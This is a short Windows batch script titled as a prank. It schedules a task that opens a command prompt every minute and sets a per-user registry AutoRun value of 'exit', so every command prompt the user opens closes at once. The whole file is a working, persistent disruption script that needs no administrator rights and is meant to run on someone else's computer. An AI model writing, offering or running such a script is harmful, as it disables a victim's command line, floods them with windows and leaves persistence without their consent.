@echo off
:: Does not need administrator

set "TASK_NAME=GetPranked"

:: Schedule task to run cmd.exe every minute
schtasks /create /tn "%TASK_NAME%" /tr "cmd.exe" /sc MINUTE /mo 1 /f
schtasks /run /tn "%TASK_NAME%"

:: Install my autorun
reg add "HKCU\Software\Microsoft\Command Processor" /v AutoRun /d "exit" /f

exit
